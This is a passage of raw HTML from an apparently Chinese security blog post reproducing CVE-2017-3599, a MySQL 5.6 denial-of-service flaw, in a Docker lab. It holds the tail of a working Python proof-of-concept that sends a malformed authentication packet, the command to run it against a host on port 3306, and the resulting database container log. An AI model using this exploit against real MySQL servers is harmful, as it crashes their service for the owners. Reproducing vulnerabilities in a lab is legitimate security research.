class=\"string\">Conditions to crash:</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">1 - packet_auth must start with \\xff or \\xfe</span></span><br><span class=\"line\"><span class=\"string\">2 - packet_auth must be shorter than 8 chars</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">The expected value is the password, which could be of two different formats</span></span><br><span class=\"line\"><span class=\"string\">(null terminated or length encoded) depending on the client functionality.</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">packet = packet_cap + packet_max + packet_cset + p_reserved + packet_usr + packet_auth </span><br><span class=\"line\">packet_len = pack(<span class=\"string\">&#x27;i&#x27;</span>,<span class=\"built_in\">len</span>(packet))[:<span class=\"number\">3</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">request = packet_len + packet_num + packet</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Connecting to host...&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    s.connect((HOST, PORT))</span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Connected.&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Unable to connect to host &quot;</span> + HOST + <span class=\"string\">&quot; on port &quot;</span> + <span class=\"built_in\">str</span>(PORT) + <span class=\"string\">&quot;.&quot;</span>\t</span><br><span class=\"line\">    s.close()</span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Exiting.&quot;</span></span><br><span class=\"line\">    exit(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Receiving greeting from remote host...&quot;</span></span><br><span class=\"line\">data = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Done.&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Sending our payload...&quot;</span></span><br><span class=\"line\">s.send(request)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] Done.&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#print &quot;Our data: %r&quot; % request</span></span><br><span class=\"line\"></span><br><span class=\"line\">s.close()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"攻击执行\"><a href=\"#攻击执行\" class=\"headerlink\" title=\"攻击执行\"></a>攻击执行</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python poc.py IP 3306</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"攻击效果\"><a href=\"#攻击效果\" class=\"headerlink\" title=\"攻击效果\"></a>攻击效果</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">拒绝服务，查看数据库的容器日志：</span><br><span class=\"line\"></span><br><span class=\"line\">root@yml-penetration:~/Workspace/cve-2017-3599<span class=\"comment\"># docker logs 100</span></span><br><span class=\"line\">Initializing database</span><br><span class=\"line\">2023-12-19 12:19:33 0 [Note] Ignoring --secure-file-priv value as server is running with --bootstrap.</span><br><span class=\"line\">2023-12-19 12:19:33 0 [Note] /usr/sbin/mysqld (mysqld 5.6.35) starting as process 36 ...</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Memory barrier is not used</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Compressed tables use zlib 1.2.8</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Using Linux native AIO</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Not using CPU crc32 instructions</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Initializing buffer pool, size = 128.0M</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: The first specified data file ./ibdata1 did not exist: a new database to be created!</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Setting file ./ibdata1 size to 12 MB</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Database physically writes the file full: <span class=\"built_in\">wait</span>...</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Setting <span class=\"built_in\">log</span> file ./ib_logfile101 size to 48 MB</span><br><span class=\"line\">2023-12-19 12:19:33 36 [Note] InnoDB: Setting <span class=\"built_in\">log</span> file ./ib_logfile1 size to 48 MB</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: Renaming <span class=\"built_in\">log</span> file ./ib_logfile101 to ./ib_logfile0</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Warning] InnoDB: New <span class=\"built_in\">log</span> files created, LSN=45781</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: Doublewrite buffer not found: creating new</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: Doublewrite buffer created</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: 128 rollback segment(s) are active.</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Warning] InnoDB: Creating foreign key constraint system tables.</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: Foreign key constraint system tables created</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: Creating tablespace and datafile system tables.</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: Tablespace and datafile system tables created.</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: Waiting <span class=\"keyword\">for</span> purge to start</span><br><span class=\"line\">2023-12-19 12:19:34 36 [Note] InnoDB: 5.6.35 started; <span class=\"built_in\">log</span> sequence number 0</span><br><span class=\"line\">2023-12-19 12:19:36 36 [Note] Binlog end</span><br><span class=\"line\">2023-12-19 12:19:36 36 [Note] InnoDB: FTS optimize thread exiting.</span><br><span class=\"line\">2023-12-19 12:19:36 36 [Note] InnoDB: Starting shutdown...</span><br><span class=\"line\">2023-12-19 12:19:38 36 [Note] InnoDB: Shutdown completed; <span class=\"built_in\">log</span> sequence number 1625977</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">2023-12-19 12:19:38 0 [Note] Ignoring --secure-file-priv value as server is running with --bootstrap.</span><br><span class=\"line\">2023-12-19 12:19:38 0 [Note] /usr/sbin/mysqld (mysqld 5.6.35) starting as process 59 ...</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Memory barrier is not used</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Compressed tables use zlib 1.2.8</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Using Linux native AIO</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Not using CPU crc32 instructions</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Initializing buffer pool, size = 128.0M</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Highest supported file format is Barracuda.</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: 128 rollback segment(s) are active.</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Waiting <span class=\"keyword\">for</span> purge to start</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: 5.6.35 started; <span class=\"built_in\">log</span> sequence number 1625977</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] Binlog end</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: FTS optimize thread exiting.</span><br><span class=\"line\">2023-12-19 12:19:38 59 [Note] InnoDB: Starting shutdown...</span><br><span class=\"line\">2023-12-19 12:19:40 59 [Note] InnoDB: Shutdown completed; <span class=\"built_in\">log</span> sequence number 1625987</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PLEASE REMEMBER TO SET A PASSWORD FOR THE MySQL root USER !</span><br><span class=\"line\">To <span class=\"keyword\">do</span> so, start the server, <span class=\"keyword\">then</span> issue the following commands:</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/bin/mysqladmin -u root password <span class=\"string\">&#x27;new-password&#x27;</span></span><br><span class=\"line\">/usr/bin/mysqladmin -u root -h 100bfe039d09 password <span class=\"string\">&#x27;new-password&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">Alternatively you can run:</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/bin/mysql_secure_installation</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">which</span> will also give you the option of removing the <span class=\"built_in\">test</span></span><br><span class=\"line\">databases and anonymous user created by default.  This is</span><br><span class=\"line\">strongly recommended <span class=\"keyword\">for</span> production servers.</span><br><span class=\"line\"></span><br><span class=\"line\">See the manual <span class=\"keyword\">for</span> more instructions.</span><br><span class=\"line\"></span><br><span class=\"line\">Please report any problems at http://bugs.mysql.com/</span><br><span class=\"line\"></span><br><span class=\"line\">The latest information about MySQL is available on the web at</span><br><span class=\"line\"></span><br><span class=\"line\">http://www.mysql.com</span><br><span class=\"line\"></span><br><span class=\"line\">Support MySQL by buying support/licenses at http://shop.mysql.com</span><br><span class=\"line\"></span><br><span class=\"line\">Note: new default config file not created.</span><br><span class=\"line\">Please make sure your config file is current</span><br><span class=\"line\"></span><br><span class=\"line\">WARNING: Default config file /etc/mysql/my.cnf exists on the system</span><br><span class=\"line\">This file will be <span class=\"built_in\">read</span> by default by the MySQL server</span><br><span class=\"line\">If you <span class=\"keyword\">do</span> not want to use this, either remove it, or use the</span><br><span class=\"line\">--defaults-file argument to mysqld_safe when starting the server</span><br><span class=\"line\"></span><br><span class=\"line\">Database initialized</span><br><span class=\"line\">MySQL init process <span class=\"keyword\">in</span> progress...</span><br><span class=\"line\">2023-12-19 12:19:40 0 [Note] mysqld (mysqld 5.6.35) starting as process 87 ...</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] Plugin <span class=\"string\">&#x27;FEDERATED&#x27;</span> is disabled.</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Memory barrier is not used</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Compressed tables use zlib 1.2.8</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Using Linux native AIO</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Not using CPU crc32 instructions</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Initializing buffer pool, size = 128.0M</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Completed initialization of buffer pool</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Highest supported file format is Barracuda.</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: 128 rollback segment(s) are active.</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: Waiting <span class=\"keyword\">for</span> purge to start</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] InnoDB: 5.6.35 started; <span class=\"built_in\">log</span> sequence number 1625987</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Warning] No existing UUID has been found, so we assume that this is the first time that this server has been started. Generating a new UUID: e27a6a12-9e68-11ee-867c-0242ac110002.</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Warning] <span class=\"string\">&#x27;user&#x27;</span> entry <span class=\"string\">&#x27;root@100bfe039d09&#x27;</span> ignored <span class=\"keyword\">in</span> --skip-name-resolve mode.</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Warning] <span class=\"string\">&#x27;user&#x27;</span> entry <span class=\"string\">&#x27;@100bfe039d09&#x27;</span> ignored <span class=\"keyword\">in</span> --skip-name-resolve mode.</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Warning] <span class=\"string\">&#x27;proxies_priv&#x27;</span> entry <span class=\"string\">&#x27;@ root@100bfe039d09&#x27;</span> ignored <span class=\"keyword\">in</span> --skip-name-resolve mode.</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] Event Scheduler: Loaded 0 events</span><br><span class=\"line\">2023-12-19 12:19:40 87 [Note] mysqld: ready <span class=\"keyword\">for</span> connections.</span><br><span class=\"line\">Version: <span class=\"string\">&#x27;5.6.35&#x27;</span>  socket: <span class=\"string\">&#x27;/var/run/mysqld/mysqld.sock&#x27;</span>  port: 0  MySQL Community Server (GPL)</span><br><span class=\"line\">Warning: Unable to load <span class=\"string\">&#x27;/usr/share/zoneinfo/iso3166.tab&#x27;</span> as time zone. Skipping it.</span><br><span class=\"line\">Warning: Unable to load <span class=\"string\">&#x27;/usr/share/zoneinfo/leap-seconds.list&#x27;</span> as time zone. Skipping it.</span><br><span class=\"line\">Warning: Unable to load <span class=\"string\">&#x27;/usr/share/zoneinfo/zone.tab&#x27;</span> as time zone. Skipping it.</span><br><span class=\"line\">2023-12-19 12:19:42 87 [Warning] <span class=\"string\">&#x27;proxies_priv&#x27;</span> entry <span class=\"string\">&#x27;@ root@100bfe039d09&#x27;</span> ignored <span class=\"keyword\">in</span> --skip-name-resolve mode.</span><br><span class=\"line\"></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] mysqld: Normal shutdown</span><br><span class=\"line\"></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Giving 0 client threads a chance to die gracefully</span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Event Scheduler: Purging the queue. 0 events</span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down slave threads</span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Forcefully disconnecting 0 remaining clients</span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Binlog end</span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;partition&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_DATAFILES&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_TABLESPACES&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_FOREIGN_COLS&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_FOREIGN&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_FIELDS&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_COLUMNS&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_INDEXES&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_TABLESTATS&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_SYS_TABLES&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_FT_INDEX_TABLE&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_FT_INDEX_CACHE&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_FT_CONFIG&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_FT_BEING_DELETED&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_FT_DELETED&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_FT_DEFAULT_STOPWORD&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_METRICS&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_BUFFER_POOL_STATS&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_BUFFER_PAGE_LRU&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_BUFFER_PAGE&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_CMP_PER_INDEX_RESET&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_CMP_PER_INDEX&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_CMPMEM_RESET&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_CMPMEM&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_CMP_RESET&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_CMP&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_LOCK_WAITS&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_LOCKS&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;INNODB_TRX&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] Shutting down plugin <span class=\"string\">&#x27;InnoDB&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] InnoDB: FTS optimize thread exiting.</span><br><span class=\"line\">2023-12-19 12:19:42 87 [Note] InnoDB: Starting shutdown...</span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] InnoDB: Shutdown completed; <span class=\"built_in\">log</span> sequence number 1625997</span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;BLACKHOLE&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;ARCHIVE&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;PERFORMANCE_SCHEMA&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;MRG_MYISAM&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;MyISAM&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;CSV&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;MEMORY&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;sha256_password&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;mysql_old_password&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;mysql_native_password&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] Shutting down plugin <span class=\"string\">&#x27;binlog&#x27;</span></span><br><span class=\"line\">2023-12-19 12:19:43 87 [Note] mysqld: Shutdown complete</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">MySQL init process <span class=\"keyword\">done</span>. Ready <span class=\"keyword\">for</span> start up.</span><br><span class=\"line\"></span><br><span class=\"line\">2023-12-19 12:19:44 0 [Note] mysqld (mysqld 5.6.35) starting as process 1 ...</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] Plugin <span class=\"string\">&#x27;FEDERATED&#x27;</span> is disabled.</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Using atomics to ref count buffer pool pages</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: The InnoDB memory heap is disabled</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Memory barrier is not used</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Compressed tables use zlib 1.2.8</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Using Linux native AIO</span><br><span class=\"line\">2023-12-19 12:19:44 1 [Note] InnoDB: Not using CPU crc32 